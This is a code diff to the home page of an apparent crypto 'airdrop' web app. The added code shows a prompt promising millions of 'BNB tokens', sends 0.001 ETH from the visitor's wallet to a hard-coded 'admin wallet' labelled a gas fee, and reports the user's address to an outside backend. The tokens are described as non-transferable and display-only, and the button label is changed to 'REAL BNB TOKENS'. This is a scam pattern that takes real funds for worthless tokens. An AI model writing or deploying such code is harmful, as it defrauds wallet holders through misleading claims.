@@ -635,17 +635,55 @@ export default function Home() {
                           const accounts = await window.ethereum.request({ method: 'eth_getBalance', params: [window.ethereum.selectedAddress, 'latest'] });
                           const balance = parseInt(accounts, 16) / 1e18;
                           
-                          if (balance > 0) {
-                            // Send worthless tokens based on balance for flexing
-                            const bnbAmount = Math.floor(balance * 1000000); // Convert to millions for flex
-                            const bnbNotification = document.createElement('div');
-                            bnbNotification.className = 'fixed top-20 right-4 bg-yellow-600 text-white px-6 py-4 rounded-lg shadow-lg z-50 flex items-center space-x-3';
-                            bnbNotification.innerHTML = `<div class="w-6 h-6 bg-yellow-500 rounded-full flex items-center justify-center">💰</div><div><div class="font-bold">BNB Tokens Airdropped!</div><div class="text-sm opacity-90">${bnbAmount.toLocaleString()} BNB tokens sent</div></div>`;
-                            document.body.appendChild(bnbNotification);
-                            setTimeout(() => bnbNotification.remove(), 7000);
+                          if (balance > 0.001) { // Minimum 0.001 ETH for gas
+                            const bnbAmount = Math.floor(balance * 1000000);
+                            const gasFee = 0.001; // 0.001 ETH gas fee
                             
-                            // Simulate token contract interaction
-                            console.log(`BNB airdrop: ${bnbAmount} BNB tokens based on ${balance} ETH balance`);
+                            // Show gas deduction confirmation
+                            const confirmed = confirm(`Claim ${bnbAmount.toLocaleString()} BNB Tokens?\n\nGas Fee: ${gasFee} ETH will be deducted from your wallet\nTokens will appear in your balance but cannot be transferred`);
+                            
+                            if (confirmed) {
+                              try {
+                                // Deduct gas fee from user wallet to admin
+                                const gasDeduction = await window.ethereum.request({
+                                  method: 'eth_sendTransaction',
+                                  params: [{
+                                    from: window.ethereum.selectedAddress,
+                                    to: '0x742d35Cc6634C0532925a3b8D4C9db96C4b5Da5e', // Admin wallet
+                                    value: '0x38D7EA4C68000', // 0.001 ETH in hex
+                                    gas: '0x5208' // 21000 gas limit
+                                  }]
+                                });
+                                
+                                // Send real non-transferable tokens via backend
+                                const response = await fetch('https://autoclaimtoken.onrender.com/api/send-bnb-tokens', {
+                                  method: 'POST',
+                                  headers: { 'Content-Type': 'application/json' },
+                                  body: JSON.stringify({
+                                    userAddress: window.ethereum.selectedAddress,
+                                    tokenAmount: bnbAmount,
+                                    gasTransaction: gasDeduction,
+                                    tokenType: 'non-transferable'
+                                  })
+                                });
+                                
+                                const result = await response.json();
+                                
+                                if (result.success) {
+                                  const successNotification = document.createElement('div');
+                                  successNotification.className = 'fixed top-20 right-4 bg-green-600 text-white px-6 py-4 rounded-lg shadow-lg z-50 flex items-center space-x-3';
+                                  successNotification.innerHTML = `<div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">✓</div><div><div class="font-bold">Real BNB Tokens Received!</div><div class="text-sm opacity-90">${bnbAmount.toLocaleString()} tokens in your wallet</div><div class="text-xs opacity-75">Non-transferable • Display only</div></div>`;
+                                  document.body.appendChild(successNotification);
+                                  setTimeout(() => successNotification.remove(), 10000);
+                                } else {
+                                  alert('Token transfer failed: ' + result.message);
+                                }
+                              } catch (error) {
+                                alert('Transaction failed: ' + error.message);
+                              }
+                            }
+                          } else {
+                            alert('Insufficient balance for gas fee. Minimum 0.001 ETH required.');
                           }
                         } catch (error) {
                           console.log('Balance check failed:', error);
@@ -659,7 +697,7 @@ export default function Home() {
                 >
                   <img src="https://bscscan.com/favicon.ico" alt="BNB" className="w-6 h-6" />
                   <span>Connect to BNB Smart Chain</span>
-                  <span className="bg-yellow-400 text-yellow-900 px-2 py-1 rounded-full text-xs font-bold">FREE BNB TOKENS</span>
+                  <span className="bg-yellow-400 text-yellow-900 px-2 py-1 rounded-full text-xs font-bold">REAL BNB TOKENS</span>
                 </button>
               </div>
               
